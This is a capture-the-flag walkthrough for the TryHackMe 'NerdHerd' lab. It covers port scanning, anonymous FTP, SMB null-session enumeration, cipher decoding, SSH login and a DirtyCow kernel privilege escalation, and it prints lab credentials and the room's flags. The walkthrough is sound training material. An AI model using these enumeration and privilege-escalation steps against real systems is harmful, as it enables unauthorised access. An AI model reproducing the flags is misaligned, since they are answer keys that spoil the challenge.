# TryHackMe — NerdHerd

## Recon

Standard full port nmap first:

```
nmap -Pn -sS -sV -sC -A -T4 -p- 10.49.172.170
```

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1337/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

FTP, SSH, SMB, and a web server sitting on the very fitting port **1337**. FTP also shows anonymous login is allowed, so that's the obvious starting point.

## Anonymous FTP

```
ftp> ls -al
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
```

Inside `pub` there's an image and a hidden folder:

```
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .jokesonyou
-rw-rw-r--    1 ftp      ftp         89894 Sep 11  2020 youfoundme.png
```

Grabbed both. Inside `.jokesonyou` there's a little taunt:

```
$ cat hellon3rd.txt
all you need is in the leet
```

"The leet" — pretty clearly a nod to port **1337**, so that's coming back into play later.

## EXIF digging

Ran the image through exiftool since a file named `youfoundme.png` practically begs for it:

```
$ exiftool youfoundme.png
...
Owner Name                      : fijbxslz
```

`fijbxslz` — not a word, so it's almost certainly ciphertext of some kind.

## Port 1337 and the Vigenère key

Hit up the web server on 1337, and buried in the page source is a link:

```html
<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>.</p>
```

The video points to the phrase "bird is the word." Feeding that in as a Vigenère key against the EXIF owner name in CyberChef:

- Input: `fijbxslz`
- Key: `birdistheword`
- Output: `easypass`

So now I've got a password — `easypass` — but no username yet.

## Enumerating a user

Ran enum4linux against the box for some good old null-session enumeration:

```
$ enum4linux 10.49.172.170
```

```
[+] Server 10.49.172.170 allows sessions using username '', password ''

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
nerdherd_classified Disk      Samba on Ubuntu
IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
```

RID cycling turns up a user:

```
S-1-5-21-2306820301-2176855359-2727674639-1000 NERDHERD\chuck (Local User)
```

`chuck` — of course. Trying `chuck:easypass` against the `nerdherd_classified` share:

```
$ smbclient //10.49.172.170/nerdherd_classified -U chuck
Password for [WORKGROUP\chuck]: 
smb: \> ls
  secr3t.txt                          N      125  Thu Sep 10 21:29:53 2020
```

Got in. Downloaded `secr3t.txt`:

```
Ssssh! don't tell this anyone because you deserved it this far:

	check out "/this1sn0tadirect0ry"

Sincerely,
	0xpr0N3rd
<3
```

## The hidden directory

Back to port 1337, this time browsing straight to `/this1sn0tadirect0ry/`. Directory listing was enabled, exposing a `creds.txt`:

```
alright, enough with the games.

here, take my ssh creds:

	chuck : th1s41ntmypa5s
```

Real SSH creds this time, no more ciphers.

## Shell access

```
$ ssh chuck@10.49.172.170
chuck@10.49.172.170's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
```

We're in as chuck. **User flag secured.**

```
chuck@nerdherd:~$ cat user.txt
THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}
```

**User flag: `THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}`**

## Privesc — DirtyCow

Ran linpeas to check for low-hanging fruit, and the kernel version jumps straight out:

```
Linux version 4.4.0-31-generic ... #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016
```

4.4.0-31-generic is squarely in DirtyCow (CVE-2016-5195) territory. Grabbed a working `cowroot.c`, compiled and ran it:

```
chuck@nerdherd:/tmp$ gcc cowroot.c -o cowroot -pthread
chuck@nerdherd:/tmp$ ./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 54256
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.

root@nerdherd:/tmp#
```

Root shell popped. Went straight for the flag:

```
root@nerdherd:/root# cat root.txt
cmon, wouldnt it be too easy if i place the root flag here?
```

Classic troll. Had a poke around root's `.bash_history` first (which is basically a full diary of how the box was built — vsftpd, the SMB share, the hidden directory, all of it) and near the bottom, tucked in the middle of history, there's a bonus flag sitting in plain sight:

```
rm youfoundme.png 
THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}
```

**Bonus flag: `THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}`**

Then found where the real root flag was actually hidden:

```
root@nerdherd:/root# cat /opt/.root.txt
nOOt nOOt! you've found the real flag, congratz!

THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}
```

**Root flag: `THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}`**


Thanks for reading!
